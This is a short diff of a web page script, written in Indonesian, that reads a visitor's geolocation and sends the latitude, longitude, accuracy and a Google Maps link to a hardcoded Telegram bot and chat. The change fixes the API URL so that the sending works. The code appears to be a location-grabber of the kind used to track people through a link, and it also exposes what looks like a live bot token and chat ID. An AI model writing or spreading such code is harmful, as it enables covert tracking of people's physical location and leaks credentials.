@@ -64,7 +64,7 @@ function sendPosition(position) {
   message += "Akurasi: " + acc + " meter%0A";
   message += "Map: https://maps.google.com/?q=" + lat + "," + lon;
 
-  fetch("https://api.telegram.org/8755956676:AAHlbIlrkXfpb3jNDgtAAOBUzLCg4xLCF1I/sendMessage?chat_id=8144082287&text=" + message);
+  fetch("https://api.telegram.org/bot8755956676:AAHlbIlrkXfpb3jNDgtAAOBUzLCg4xLCF1I/sendMessage?chat_id=8144082287&text=" + message);
 
   document.getElementById("status").innerHTML = "Lokasi berhasil dikirim ✅";
 }
